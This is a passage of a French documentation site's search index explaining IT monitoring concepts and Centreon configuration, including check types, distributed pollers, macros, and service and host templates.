donn\u00e9es  </li> <li>Alerter, notifier et r\u00e9agir en cas de probl\u00e8me sur le syst\u00e8me  </li> </ul>"},{"location":"supervision/supervision/#points-de-controle","title":"Points de contr\u00f4le","text":"<p>Peu importe le syst\u00e8me supervis\u00e9, celle-ci sera toujours d\u00e9coup\u00e9e en 3 cat\u00e9gories de points de contr\u00f4le :  </p> <ul> <li>Contr\u00f4le de disponibilit\u00e9 : s'assure de la pr\u00e9sence d'un \u00e9quipement, d'une application ...  </li> <li>Contr\u00f4le de performance : s'assure des performances fournies par un \u00e9quipement, une application...  </li> <li>Contr\u00f4le d'int\u00e9grit\u00e9 : s'assure qu'il n'existe pas d'incoh\u00e9rence dans le fonctionnementpr\u00e9vu d'un \u00e9quipement, d'un service, d'une application...  </li> </ul> <p>C'est diff\u00e9rent controle sont mis en place sur la supervison afin de r\u00e9colter suffisament d'information en cas de probl\u00e8me sur le syst\u00e8me d'information.  </p>"},{"location":"supervision/supervision/#domaine-dapplication","title":"Domaine d'application","text":"<p>La supervision peut \u00eatre appliqu\u00e9e \u00e0 plusieurs domaine tel que :  </p> <ul> <li>Le r\u00e9seau :  <ul> <li>Disponibilit\u00e9 d'\u00e9quipement,  </li> <li>Latence,  </li> <li>Taux d'erreur d'une liaison,  </li> <li>Bande Passante,  </li> <li>Routage...</li> </ul> </li> <li>Mat\u00e9riel et environnement :  <ul> <li>Temp\u00e9rature,  </li> <li>Humidit\u00e9,  </li> <li>Taux de charges I/O d'un disque,  </li> <li>Charge d'Onduleur,  </li> <li>RAID,  </li> <li>Alimentations,  </li> <li>Ventilateurs,  </li> <li>Lecteurs,  </li> <li>Imprimantes...  </li> </ul> </li> <li>Syst\u00e8me :  <ul> <li>Fr\u00e9quence Processeur,  </li> <li>Utilisation M\u00e9moire (Physique ou Virtuelle),  </li> <li>Journaux d'\u00e9v\u00e9nements syst\u00e8me...  </li> </ul> </li> <li>Middlewares :  <ul> <li>Lancement des services,  </li> <li>Temps de r\u00e9ponse d'un serveur Web,  </li> <li>Nombre de VM sur un hyperviseur,  </li> <li>Envois de mails...  </li> </ul> </li> <li>Applications :  <ul> <li>Disponibilit\u00e9 d'un socket,  </li> <li>Processus lanc\u00e9,  </li> <li>Tests sp\u00e9cifiques couvrant les fonctionnalit\u00e9s de l'application...</li> </ul> </li> <li>SLA :  <ul> <li>Garantir les SLA d'un service en r\u00e9cup\u00e9rant certains indicateurs : temps d'affichage d'une page, page non fonctionnelle, nombre de connexions...  </li> </ul> </li> </ul>"},{"location":"supervision/supervision/#comment-superviser","title":"Comment Superviser ?","text":"<p>Il existe deux r\u00e8gles qu'il est pr\u00e9f\u00e9rable de respecter :  </p> <ul> <li>La supervision doit \u00eatre la moins intrusive possible  </li> <li>La supervision doit \u00eatre la plus ind\u00e9pendante possible des \u00e9l\u00e9ments supervis\u00e9s  </li> </ul>"},{"location":"supervision/supervision/#methode-de-supervision","title":"M\u00e9thode de supervision","text":""},{"location":"supervision/supervision/#supervision-active","title":"Supervision Active","text":"<p>Il s'agit de la m\u00e9thode la plus employ\u00e9es. Elle consiste \u00e0 \u00e9mettre des requ\u00eates d'interrogation par la plateforme de supervision \u00e0 destination des \u00e9l\u00e9ments supervis\u00e9s. On parlera dans ce cas de checks actifs La supervision Active comporte 2 sous-ensembles :  </p>"},{"location":"supervision/supervision/#checks-actifs-locaux","title":"Checks actifs locaux","text":"<p>Ce sont des v\u00e9rifications des services / ressources directement h\u00e9berg\u00e9es et \u00e9x\u00e9cut\u00e9 depuis sur le serveur de supervision (CPU, m\u00e9moire, espace disque, ...) Ces v\u00e9rifications sont effectu\u00e9es sur les composants du r\u00e9seau mais \u00e9galement sur le serveur lui m\u00eame. C'est au serveur de supervision d'effectuer les commandes de r\u00e9cup\u00e9ration de l'information et d'en faire le traitement.  </p> <p></p> <p>Les principaux checks actifs locaux s'effectueront gr\u00e2ce \u00e0 :  </p> <ul> <li>La v\u00e9rification d'un socket TCP/UDP  </li> <li>Ressource directement sur le serveur de supervision  </li> </ul> <p>Les checks actifs locaux \u00e9tant limit\u00e9 nous pourrons passer au :  </p>"},{"location":"supervision/supervision/#checks-actifs-distant","title":"Checks actifs distant","text":"<p>L'\u00e9l\u00e9ment ex\u00e9cutant les tests ne sera plus le serveur de supervision. Ce dernier initie une commande de check sp\u00e9cifique (distant) \u00e0 destination de l'h\u00f4te distant responsable du test. Cette commande indique \u00e0 l'h\u00f4te distant le test que celui-ci doit effectuer (commande, arguments, options, \u00e9l\u00e9ments cibl\u00e9s...) Une fois l'action ex\u00e9cut\u00e9e, l'h\u00f4te distant transmet au serveur de supervision les r\u00e9sultats obtenus.  </p> <p>Ces test ne pourront \u00eatre r\u00e9alis\u00e9s que si les commandes de check existent sur l'h\u00f4te distant et qu'un agent est install\u00e9 sur le poste distant. Pour ce faire les principales commandes de checks actifs distant sont :  </p> <ul> <li>Check_by_ssh,  </li> <li>Check_nrpe,  </li> <li>Requ\u00eates SNMP,  </li> <li>Requ\u00eates WMI  </li> </ul> <p>L'utilisation des checks actifs distants pr\u00e9sente plusieurs avantages :  </p> <ul> <li>Moins de travail pour le superviseur,  </li> <li>Acc\u00e8s \u00e0 des ressources normalement impossibles depuis le superviseur,  </li> <li>D\u00e9passement des limites du syst\u00e8me h\u00f4te de supervision  </li> </ul> <p></p> <p>L'h\u00f4te distant peut effectuer des test sur ses propres services/ressources ou sur d'autre \u00e9l\u00e9ments de son r\u00e9seau (on parlera dans ce cas de relais distant)  </p>"},{"location":"supervision/supervision/#supervision-passive","title":"Supervision Passive","text":"<p>A la diff\u00e9rence de la supervision active ou le serveur emet des requ\u00eates pour r\u00e9cuperer les informations, la supervision passive consiste \u00e0 attendre que les ressources supervis\u00e9es transmettent des alertes au serveur de supervision. La ressource supervis\u00e9e v\u00e9rifie son \u00e9tat et transmet de mani\u00e8re autonome le r\u00e9sultat au serveur de supervision qui apr\u00e8s r\u00e9ception la traitera.  </p> <p></p> <p>La supervision passive permet la surveillance en temps r\u00e9el, \u00e0 l'inverse de la supervision active qui emet des requetes de mani\u00e8re periodique. Cependant, l'absence d'alerte ne signifie pas forc\u00e9ment que la ressource supervis\u00e9e est dans un \u00e9tat correct de fonctionnement. De plus ce genre de supervision n'est pas forc\u00e9ment applicable \u00e0 toutes les situtations. Il sera pr\u00e9f\u00e9rable de l'utiliser conjointement avec de la supervision Active.  </p> <p>Les principaux checks passif seront r\u00e9alis\u00e9s via les protocoles :  </p> <ul> <li>SNMP : (Simple Network Management Protocol) On parlera alors de trap SNMP. Ils sont massivement impl\u00e9ment\u00e9s sur les \u00e9quipements r\u00e9seaux/d'infrastructure et les possibilit\u00e9s sont d\u00e9finies \u00e0 l'avance par le constructeur.  </li> <li>NSCA : (Nagios Service Check Acceptor) Permettra l'envoi d'informations au serveur de supervision \u00e0 des fins de supervision. Ce protocole a l'avantage d'\u00eatre utilisable depuis n'importe quel contexte, sous Linux et Windows.  </li> </ul>"},{"location":"supervision/supervision/#supervision-distribuee","title":"Supervision Distribu\u00e9e","text":""},{"location":"supervision/supervision/#theorie-et-historique","title":"Th\u00e9orie et historique","text":""},{"location":"supervision/supervision/#theorie","title":"Th\u00e9orie","text":"<p>La supervision distribu\u00e9e est faite pour les grandes structures de supervision. Elle met en oeuvre un serveur Central ainsi que plusieurs serveurs collecteurs, \u00e9galement appel\u00e9s \"satellites\" ou \"pollers\". Chaque collecteur est charg\u00e9 d'un ensemble de v\u00e9rifications qu'il reporte en base de donn\u00e9es, qui se charge ensuite sur le serveur Central afin de l'afficher sur son interface Web.  </p> <p>On s'orientera vers une architecture distribu\u00e9e pour deux raisons :  </p> <ul> <li>Le superviseur se doit de contr\u00f4ler plusieurs centaines d'h\u00f4tes. On d\u00e9cide de distribuer la supervision entre plusieurs moteurs afin de r\u00e9partir la charge.  </li> <li>Le souhait de superviser des ressources sur un site distant, pas directement accessible depuis notre superviseur Central ou alors avec un lien r\u00e9seau \u00e0 bande passante r\u00e9duite.  </li> </ul>"},{"location":"supervision/supervision/#serveur-satellite","title":"Serveur Satellite","text":"<p>Les serveurs satellites fonctionnent de mani\u00e8re compl\u00e9tement ind\u00e9pendante. Si un serveur satellites n'arrivent plus \u00e0 joindre le Central, ils continuera les v\u00e9rifications de mani\u00e8re autonome, stockera les r\u00e9sultats en cache et les enverra une fois la communication vers le Central r\u00e9tablie.  </p> <p>La configuration des serveurs satellite s'effectue comme pour le Central, depuis l'interface Web. Il faudra d\u00e9finir depuis quel serveur de supervision sera supervis\u00e9 chaque h\u00f4te et lui exporter sa configuration. Cette \u00e9tape est effectu\u00e9e par le service \"gorgone\" sur le Central qui, \u00e0 l'aide de SSH (ou ZMQ), copiera les fichiers de configuration respectifs de chaque poller.  </p> <p>NDOUtils est un module additionnel permettant \u00e0 Nagios d'\u00e9crire dans une base de donn\u00e9es l'\u00e9tat des machines et services \u00e0 superviser. NDOUtils est compos\u00e9 de deux modules : NDOMOD et NDO2DB. NDOMOD doit \u00eatre lanc\u00e9 sur le serveur Nagios et permet de r\u00e9cup\u00e9rer les informations remont\u00e9es par Nagios pour les transmettre via TCP (port 5669) (ou un socket Unix) vers NDO2DB. NDO2DB est un d\u00e9mon qui \u00e9coute sur un port TCP (ou un socket Unix) et \u00e9crit les donn\u00e9es re\u00e7ues dans une base de donn\u00e9es (MySQL ou PostgreSQL).  </p> <p>Aujourd'hui avec Centreon, le moteur Nagios est devenu Centreon-Engine et les NDOUtils Centreon-Broker. Comme pour les NDOUtils, Centreon-Broker est divis\u00e9 en deux \u00e9l\u00e9ments :  </p> <ul> <li>Centreon-broker-module pour r\u00e9cup\u00e9rer les informations de supervision de Centreon-Engine  </li> <li>Centreon-broker-database pour l'inscription des donn\u00e9es de supervision en base de donn\u00e9es et la g\u00e9n\u00e9ration des graphiques (RRD files).  </li> </ul>"},{"location":"supervision/supervision/#roles-dans-centreon","title":"R\u00f4les dans Centreon","text":""},{"location":"supervision/supervision/#centreon-central-database","title":"Centreon Central Database","text":"<p>Ce serveur peut \u00eatre compos\u00e9 de tous les r\u00f4les importants de la supervision :  </p> <ul> <li>Centreon-Engine : Moteur de supervision,  </li> <li>Centreon : interface Web,  </li> <li>Centreon-broker-module &amp; Centreon-broker-database : Broker,  </li> <li>MariaDB : Base de donn\u00e9es,  </li> <li>etc.  </li> </ul> <p>Il est possible d'utiliser tout autre type de base de donn\u00e9es \u00e0 la place de MariaDB. Elle peut \u00e9galement \u00eatre d\u00e9port\u00e9e sur un autre serveur.  </p>"},{"location":"supervision/supervision/#centreon-poller","title":"Centreon Poller","text":"<p>Ces serveurs sont compos\u00e9s uniquement d'un moteur de supervision (Centreon-Engine) et du broker (Centreon-broker-module). Les diff\u00e9rents \u00e9changes de donn\u00e9es sont faits via des connexions SSH (ou ZMQ). Il est donc important de bien g\u00e9rer les \u00e9changes de clef RSA entre les POLLERS et le Central DATABASE.  </p> <p></p>"},{"location":"supervision/Centreon/Configuration/","title":"Configuration","text":""},{"location":"supervision/Centreon/Configuration/#bonnes-pratiques","title":"Bonnes Pratiques","text":""},{"location":"supervision/Centreon/Configuration/#variabiliser","title":"Variabiliser","text":"<p>Lors de l'\u00e9criture des commandes dans Centreon, il sera tr\u00e8s important de les rendre les plus neutres possibles avec un maximum de parm\u00e8tres variables. Prenons l'exemple de la commande pour v\u00e9rifier le CPU avec le Centreon-Plugins Windows. Comme param\u00e8tre, nous avons :  </p> <ul> <li>L'adresse IP de la machine h\u00f4te afin de v\u00e9rifier sa consommation CPU  </li> <li>La communaut\u00e9 SNMP  </li> <li>La version SNMP  </li> <li>Un seuil WARNING d'utilisation du CPU  </li> <li>Un seuil CRITICAL d'utilisation du CPU  </li> </ul>"},{"location":"supervision/Centreon/Configuration/#nommer-les-commandes","title":"Nommer les commandes","text":"<p>Avoir une convention de nommage stricte et coh\u00e9rente est primordial pour les objets Centreon . Nous verrons qu'il en sera de m\u00eame pour tous les objets que nous cr\u00e9erons par la suite pour l'impl\u00e9mentation d'une supervision. Le plus souvent, ce seront des commandes de v\u00e9rification, on pourra donc utiliser le mot cl\u00e9 \"CHECK\" pour les identifier. Ensuite, en fonction des commandes, il peut y avoir un protocole sous-jacent utilis\u00e9 comme SNMP,WMI. Ainsi, dans le cas des CPU, le protocole utils\u00e9 sera SNMP. Le nommage final de notre commande pourrait donner <code>check_snmp_cpu</code>.</p>"},{"location":"supervision/Centreon/Configuration/#macros","title":"Macros","text":"<p>Les macros seront utilis\u00e9es lors de l'\u00e9criture des commandes afin de pouvoir variabiliser nos param\u00e8tres. Elles respectent uen nomenclature particuli\u00e8re permettant leurs identifications dans les commandes. Les macros commencent et se terminent toujours par le caract\u00e8re <code>$</code>. Elles pourront prendre leurs valeurs \u00e0 plusieurs endroits dans la configuration de Centreon et elles s'utilisent dans l'\u00e9criture des commandes. Au moment de l'appel syst\u00e8me (effectu\u00e9 par Centreon-Engine) par leur valeur 5 types de macros existe, certaines etant moins utilis\u00e9es que les autres :  </p> <ul> <li>Les macros standards  </li> <li>Les macros de type ressource  </li> <li>Les macros personnalis\u00e9es  </li> <li>Les macros \u00e0 la demande  </li> <li>Les macros arguments  </li> </ul>"},{"location":"supervision/Centreon/Configuration/#macros-standards","title":"Macros Standards","text":"<p>Il s'agit des macros historiques h\u00e9rit\u00e9es du moteur Nagios. Elles sont pr\u00e9existantes, int\u00e9gr\u00e9es au code source du moteur de supervision. Il n'est pas possible d'ajouter ni de modifier des macros standards. Elles sont utilis\u00e9es \u00e0 plusieurs endroits dans centreon (Contr\u00f4les des h\u00f4tes et services, notifications, gestionnaires d'\u00e9v\u00e8nements, etc.).  </p> <p>Il est possible de retrouver l'ensemble de ces macros avec leurs validit\u00e9s et visibilit\u00e9s dans la documentation officielle Nagios \u00e0 l'emplacement suivant : liste macros </p> <p>Le macro standard la plus utilis\u00e9e dans la d\u00e9finition des commandes est <code>$HOSTADDRESS$</code> qui permet de r\u00e9cup\u00e9rer l'adresse IP de l'h\u00f4te pour lequel la commande est ex\u00e9cut\u00e9e.  </p>"},{"location":"supervision/Centreon/Configuration/#macros-ressources","title":"Macros ressources","text":"<p>Ce sont des macros que l'on va d\u00e9finir en avance qui ont une visibilit\u00e9 globale dans Centreon et qui peuvent \u00eatre utilis\u00e9es dans n'importe quel type de commande. Elles respectent la nomenclature <code>$USERn$</code> o\u00f9 <code>n</code> est un nombre compris entre 1 et 256. Il est donc possible de d\u00e9clarer 256 macros de ressources par serveur de supervision. Ces macros sont propres \u00e0 chaque serveur de supervision.  </p> <p>Ces macros sont utilis\u00e9es pour faire r\u00e9f\u00e9rence aux chemins locaux contenant les sondes sur chaque serveur de supervision par exemple. Sont ainsi cr\u00e9\u00e9es par d\u00e9faut les macros suivantes :  </p> <ul> <li><code>$CENTREONPLUGINS$</code> avec comme valeur <code>/usr/lib/Centreon/plugins</code> </li> <li><code>$USER1$</code> avec comme valeur <code>/usr/lib64/nagios/plugins</code> </li> </ul> <p>Ici, <code>$CENTREONPLUGINS$</code> ne respecte pas la r\u00e8gle de nommage des macros ressources. En effet, depuis Centreon 18.10, il est possible de les appeler comme on veut. La cr\u00e9ation de ces macros s'effectue depuis le menu : Configuration - Pollers - Ressources </p> <p></p>"},{"location":"supervision/Centreon/Configuration/#macros-a-la-demande","title":"Macros \u00e0 la demande","text":"<p>Aussi appel\u00e9es macros d'environnement, elles permettent de r\u00e9cup\u00e9rer des informations \u00e0 un instant \"t\" sur n'importe quel objet de Centreon (h\u00f4tes,service,etc.) autre que celui concern\u00e9 au moment de l'ex\u00e9cution de la commande. il faut les \u00e9crire de cette mani\u00e8re :  </p> <ul> <li><code>$HOSTSTATE:serveurbdd2$</code> </li> </ul> <p>Attention, l'utilisation de ces macros est consommateur en termes de ressources.  </p>"},{"location":"supervision/Centreon/Configuration/#macros-arguments","title":"Macros Arguments","text":"<p>Elles permettent de rendre les commandes g\u00e9n\u00e9riques, en variabilisant les arguments des commandes. Leur nomenclature est sous la forme <code>$ARGn$</code> o\u00f9 <code>n</code> repr\u00e9sente un nombre entier. Dans une commande, le nombre d'arguments est limit\u00e9 \u00e0 32 (atteindre 32 variables dans une commande faut le faire...).  </p> <p>Dans le cas de notre commande de v\u00e9rification du CPU, nous pourrions tr\u00e8s bien les utiliser pour variabiliser le seuil WARNING et CRITICAL sous la forme <code>--warning-average=$ARG1$ --critical-average=$ARG2$</code> De plus en plus remplac\u00e9es par les macros personnalis\u00e9es.  </p>"},{"location":"supervision/Centreon/Configuration/#macros-personnalisees","title":"Macros personnalis\u00e9es","text":"<p>Compar\u00e9 aux macros arguments, elles vont permettre la m\u00eame chose, mais en mieux : variabiliser l'\u00e9criture de ses commandes pour les rendres les plus g\u00e9n\u00e9riques possibles. Nous distinguons deu types de macros personnalis\u00e9es :  </p> <ul> <li>les macros d'h\u00f4tes et les macros de services.  </li> </ul> <p>Les macros d'h\u00f4tes personnalis\u00e9es commenceront obligatoirement par <code>$_HOST</code> et les amcros de services par <code>$_SERVICE</code>. S'en suivra ensuite le nom souhait\u00e9 de la macro puis un <code>$</code> pour indiquer la fin.  </p> <ul> <li><code>$_HOSTSNMPVERSION$</code> permet de d\u00e9clarer une macro d'h\u00f4te personnalis\u00e9e qui s'appelle SNMPVERSION </li> <li><code>$_SERVICEWARNING$</code> permet de d\u00e9clarer une macro personnalis\u00e9e qui s'appelle WARNING </li> </ul> <p>Par rapport \u00e0 l'utilisation des arguments, elles permettront de donner un nom plus explicite \u00e0 nos variables. De plus, elles pourront \u00eatre red\u00e9finies de mani\u00e8re individuelle dans l'ensemble de notre configuration des services et h\u00f4tes. Enfin, nous ne sommes pas limit\u00e9s \u00e0 32 valeurs.  </p>"},{"location":"supervision/Centreon/Configuration/#ecriture-de-la-commande","title":"Ecriture de la commande","text":"<p>Pour rappel, avant toute \u00e9criture d'une commande dans Centreon, celle-ci aura d'abord \u00e9t\u00e9 test\u00e9e en Shell sous l\"utilisateur Centreon-Engine.  </p> <ul> <li>configuration =&gt; Commands =&gt; Checks </li> </ul>"},{"location":"supervision/Centreon/Configuration/#modeles-de-services","title":"Mod\u00e8les de services","text":""},{"location":"supervision/Centreon/Configuration/#service","title":"Service","text":"<p>Un service est un point de contr\u00f4le rattach\u00e9 \u00e0 un h\u00f4te. On parlera aussi de mesure ou indicateur. il peut se situer sur plusieurs couches : mat\u00e9riel, syst\u00e8me, logiciel, applicatif, processus, etc. Centreon sera ensuite en charge de contr\u00f4ler la performance du service gr\u00e2ce \u00e0 des indicateurs tels que les seuils warning et critique.  </p> <p>Pour qu'un service soit coh\u00e9rent aux yeux du moteur de supervision, il y a un ensemble de param\u00e8tres qui devront \u00eatre renseign\u00e9s. Ces param\u00e8tres pourront tr\u00e8s bien \u00eatre r\u00e9cup\u00e9r\u00e9s dans la d\u00e9finition du service lui-m\u00eame ou bien par l'interm\u00e9diaire des mod\u00e8les de services desquels il h\u00e9rite.  </p>"},{"location":"supervision/Centreon/Configuration/#elements-obligatoires","title":"El\u00e9ments obligatoires","text":"<ul> <li>Son nom, le service doit avoir un nom : Description </li> <li>L'h\u00f4te associ\u00e9 au service : Linked with Hosts </li> <li>Une p\u00e9riode de v\u00e9rification : Check Period </li> <li>Un intervalle de v\u00e9rification : normal Check Interval</li> <li>Le nombre de v\u00e9rifications pour confirmation d'un statut non OK : Max Check Attempts </li> <li>L'intervalle des v\u00e9rifications pour confirmation d'un statut non OK : Retry Check Interval </li> <li>Service actif ou passif : Active/Passive Checks Enabled </li> <li>La commande associ\u00e9e pour la v\u00e9rification du service : Check Comma </li> </ul>"},{"location":"supervision/Centreon/Configuration/#periode-de-verification-check-period","title":"P\u00e9riode de v\u00e9rification - Check Period","text":"<p>Ce sont des objets Centreon que l'on va cr\u00e9er (Configuration =&gt; Users =&gt; Time Periods) qui vont permettre de d\u00e9finir des p\u00e9riodes de temps bien d\u00e9finies. Par exemple, la p\u00e9riode 24x7 pr\u00e9d\u00e9finie englobe tout (24h/24, 7j/7) Appliqu\u00e9es \u00e0 un service, elles vont permettre d'indiquer au moteur de supervision quand le service devra \u00eatre supervis\u00e9, et quand il ne le devra pas.  </p>"},{"location":"supervision/Centreon/Configuration/#intervalle-de-verification-normal-check-interval","title":"Intervalle de v\u00e9rification - Normal Check Interval","text":"<p>On va d\u00e9finir un intervalle de v\u00e9rification pour chaque service : Normal Check Interval Ainsi, configur\u00e9 \u00e0 5 par exemple, le moteur devra donc v\u00e9rifier ce service toutes les 5 minutes sur la Check Period renseign\u00e9e. Cet intervalle de v\u00e9rification n'est valable que pour les statuts confirm\u00e9s. Le bon fonctionnement sera diff\u00e9rent pour les statuts non confirm\u00e9s.  </p>"},{"location":"supervision/Centreon/Configuration/#status-etat-hard-et-soft","title":"Status - Etat Hard et Soft","text":"<p>Il y a 2 types d'\u00e9tats : HARD et SOFT. Ils sont utilis\u00e9s pour diff\u00e9rencier les status d'erreurs confirm\u00e9s de ceux non confirm\u00e9s. Durant l'intervalle normal de v\u00e9rification, lorsuq'un statut d'erreur survient (DOWN pour un h\u00f4te et WARNING, CRITIQUE ou UNKNOWN pour une service), Centreon le confirmera \u00e0 l'aide de plusieurs contr\u00f4les successifs qu'on d\u00e9terminera \u00e0 l'aide du Max Check Attempts et du Retry Check Interval.  </p> <p>Tant qu'un statut ne sera pas confirm\u00e9, donc en \u00e9tat SOFT, aucune notification ne sera envoy\u00e9e. Une fois le statut confirm\u00e9, donc en \u00e9tat HARD, les notifications seront envoy\u00e9es.  </p> <p>A savoir : le statut UP pour un h\u00f4te et OK pour un service est automatiquement confirm\u00e9. Pour confirmer un statut SOFT en HARD, le nouvel intervalle de v\u00e9rification sera la valeur renseign\u00e9e dans Retry Check Interval et le nombre de v\u00e9rifications sera le Max Check Attempts.  </p> <p></p>"},{"location":"supervision/Centreon/Configuration/#modeles-de-services_1","title":"Mod\u00e8les de services","text":"<p>Il est tout \u00e0 fait possible de cr\u00e9er des services associ\u00e9s \u00e0 un h\u00f4te sans mod\u00e8le de service (Services Templates). N\u00e9anmoins, cr\u00e9er un service sans mod\u00e8le peut devenir tr\u00e8s long si nous en avons plusieurs et \u00eatre une source d'erreur de configuration. De plus, l'utilisation d'un mod\u00e8le devient obligatoire si nous souhaitons que des services se d\u00e9ploient automatiquement selon un mod\u00e8le d'h\u00f4te.  </p> <p>Il existe 2 types de mod\u00e8les de services :  </p> <p>Les mod\u00e8les de services de configuration Ces mod\u00e8les ne serviront pas \u00e0 d\u00e9ployer un service. Ils n'auront aucune Check Command renseign\u00e9e. En revanche, ils vont apporter toute la partie configuration du service qui pourra s'av\u00e9rer r\u00e9p\u00e9titive entre les services. Quand nous cr\u00e9erons un service pour un h\u00f4te, nous ne l'utiliserons jamais directement.  </p> <p>Les mod\u00e8les de service fonctionnels Ces mod\u00e8les permettront le d\u00e9ploiement d'un service. Ils devront absolument avoir une Check Command associ\u00e9e avec les macros renseign\u00e9es si n\u00e9cessaire. En revanche, tous les param\u00e8tres de v\u00e9rification du service seront h\u00e9rit\u00e9s d'un mod\u00e8le de configuration.  </p>"},{"location":"supervision/Centreon/Configuration/#regle-de-nommage","title":"R\u00e8gle de nommage","text":"<p>Afin de distinguer les types de mod\u00e8les de services et le service associ\u00e9, il est important d'opter pour une bonne convention de nommage.  </p> <p>Un mod\u00e8le de service par d\u00e9faut pour les checks actifs : </p> <ul> <li>STC_DEFAULT </li> </ul> <p>Un mod\u00e8le de service auquel nous aurions rattach\u00e9 la commande CHECK_SNMP_CPU_WINDOWS pourrait \u00eatre nomm\u00e9 : STF_SNMP_CPU_WINDOWS  </p>"},{"location":"supervision/Centreon/Configuration/#heritage-de-modeles-de-services","title":"H\u00e9ritage de mod\u00e8les de services","text":"<p>Admettons que nous avons le mod\u00e8le d'h\u00f4te de configuration STC_DEFAULT avec la valeur Normal Check Interval \u00e0 5 minutes. Nous cr\u00e9ons ensuite le mod\u00e8le STF_SNMP_CPU_WINDOWS, Nous lui attachons la commande CHECK_SNMP_CPU_WINDOWS et nous mettons en place un h\u00e9ritage avec le STC_DEFAULT. tous les param\u00e8tres d\u00e9finis dans le STC n'auront pas besoin d'\u00eatre r\u00e9inscrits dans le STF. Il est n\u00e9anmoins possible de red\u00e9finir des param\u00e8tres, qui \u00e9craseront ceux h\u00e9rit\u00e9s.  </p>"},{"location":"supervision/Centreon/Configuration/#modeles-dhotes","title":"Mod\u00e8les d'h\u00f4tes","text":""},{"location":"supervision/Centreon/Configuration/#un-hote","title":"Un h\u00f4te","text":"<p>Un h\u00f4te est une entit\u00e9 IP qu'on pourra appeler ressource. Derri\u00e8re cette entit\u00e9 peut se cacher un serveur virtuel, physique, un switch, un routeur, une imprimante, une cam\u00e9ra IP, etc... Il est tout \u00e0 fait possible de cr\u00e9er directement ces h\u00f4tes sans passer par des mod\u00e8les, mais comme pour les services, cela n\u00e9cessitera un param\u00e9trages qu'il sera int\u00e9ressant d'envoyer dans un ou pluseurs mod\u00e8les d'h\u00f4tes pour nous faciliter le travail et automatiser le d\u00e9ploiement de services.  </p> <p>Un h\u00f4te est cosntitu\u00e9 de :  </p> <ul> <li>Son nom : tel qu'il appara\u00eetra dans la console de supervision  </li> <li>Son IP ou nom DNS : IP Address/DNS </li> <li>une p\u00e9riode de v\u00e9rification : Check Period </li> <li>un intervalle de v\u00e9rification : Normal Check Interval </li> <li>le nombre de v\u00e9rifications pour confirmation d'un h\u00f4te non UP : Max Check Attempts </li> <li>L'intervalle des v\u00e9rification pour confirmation d'un h\u00f4te non UP : Retry Check Interval</li> <li>Check actif ou passif : Active/Passive Checks Enabled </li> <li>La commande de v\u00e9rification de l'h\u00f4te : Check Command </li> </ul>"},{"location":"supervision/Centreon/Configuration/#commande-de-verification","title":"Commande de v\u00e9rification","text":"<p>Il s'agit de la commande que le superviseur lancera \u00e0 intervalle r\u00e9gulier pour v\u00e9rifier le statut de l'h\u00f4te. Cette commande sera le plus souvent un <code>ping</code>. Ce ping ne doit absolument pas \u00eatre qualitatif. En effet, elle ne doit pas \u00eatre retourn\u00e9e en critique, si le ping met trop de temps \u00e0 r\u00e9pondre elle sera interpr\u00e9t\u00e9 en DOWN </p> <p>L'h\u00f4te peut tr\u00e8s bien fonctionner, correctement fournir tous ses services, mais va d\u00e9pendre de la qualit\u00e9 du r\u00e9seau d'interconnexion qui le s\u00e9pare de son serveur de supervision. Dans la pratique, on va cr\u00e9er une commande CHECK_HOST_ALIVE par exemple qui, en dur, dans la commande, va envoyer 1 paquet icmp avec des seuils WARNING et CRITICAL relativement \u00e9lev\u00e9s pour qu'ils ne soient jamais valid\u00e9s.  </p>"},{"location":"supervision/Centreon/Configuration/#modeles-dhotes_1","title":"Mod\u00e8les d'h\u00f4tes","text":"<p>Comme pour les mod\u00e8les de services, les mod\u00e8les d'h\u00f4te vont permettre de structurer la configuration. Dans un mod\u00e8le d'h\u00f4te, on rajoutera les mod\u00e8les de services.  </p> <p>Les mod\u00e8les d'h\u00f4tes de configuration : </p> <ul> <li>Ils permettent une configuration g\u00e9n\u00e9rique qui sera h\u00e9rit\u00e9e par tous nos h\u00f4tes.  </li> <li>Dans cette configuration g\u00e9n\u00e9rique, nous retrouverons le plus souvent les informations li\u00e9es \u00e0 SNMP, les intervalles de v\u00e9rification, la commande de v\u00e9rification de l'h\u00f4te et les informations de notification.  </li> <li>A savoir que lors du d\u00e9ploiement d'un h\u00f4te, bien que toutes ces informations soient r\u00e9cup\u00e9r\u00e9es de ce mod\u00e8le, il sera tout \u00e0 fait possible de les modifier pour un h\u00f4te en particulier.  </li> <li>Concernant le nommage, il est courant de les nommer ainsi : HTC_XXX*.<ul> <li>ex. HTC_DEFAULT</li> </ul> </li> </ul> <p>Les mod\u00e8les d'h\u00f4tes fonctionnels : </p> <p>Ces mod\u00e8les d'h\u00f4tes vont permettre de regrouper les h\u00f4tes par crit\u00e8res comme les fonctions, r\u00f4les, caract\u00e9ristiques, OS, etc... Et \u00e9galement a des crit\u00e8res pr\u00e9cis, par exemple d\u00e9ployer certains services.  </p> <p></p>"},{"location":"supervision/Centreon/Configuration/#appliquer-les-modifications","title":"Appliquer les modifications","text":""},{"location":"supervision/Centreon/Configuration/#recharger-la-configuration","title":"Recharger la configuration","text":"<p>Suite \u00e0 des ajouts/modifications d'\u00e9l\u00e9ments de configuration depuis l'interface Web, les fichiers de configuration ne sont pas directement impact\u00e9s. L'interface Web Centreon travaille sur une copie des fichiers de configuration en base de donn\u00e9es. C'est apr\u00e8s qu'on d\u00e9cidera de g\u00e9n\u00e9rer les nouveaux fichiers de configuration, de remplacer les anciens et de recharger le moteur de supervision. Un tel fonctionnement permet \u00e9galement de tester ses fichiers de configuration afin de s'assurer de ne pas recharger un service Centreon avec des fichiers de configuration mal \u00e9crits...  </p> <p></p> <p>1\u00e8re \u00e9tapes </p> <p>G\u00e9n\u00e9rer les fichiers de configuration avvec le mode debug  </p> <p></p> <p>Si l'\u00e9tape est OK il est alors possible de d\u00e9placer les fichiers de configuration et de proc\u00e9der au reload du moteur de supervision.  </p> <p></p>"},{"location":"supervision/Centreon/Configuration/#interfaces-de-supervision","title":"Interfaces de supervision","text":"<p>Maintenant que le moteur de supervision dispose d'h\u00f4tes et de services \u00e0 superviser, il est possible de visualiser l'\u00e9tat de notre supervision depuis le menu :  </p> <ul> <li>\"Monitoring =&gt; Status Details =&gt; Services\" pour les services  </li> <li>\"Monitoring =&gt; Status Details =&gt; Hosts\" pour les h\u00f4tes  </li> </ul> <p></p> <p>Pour un h\u00f4te comme pour un service (actions de masse possible), il est possible d'effectuer des actions d'exploitation.  </p> <p></p> <p>Il est possible d'agir sur les services s\u00e9lectionn\u00e9s ou sur les h\u00f4tes auxquels sont rattach\u00e9s les services. Ces m\u00eames actions sont disponibles pour les h\u00f4tes 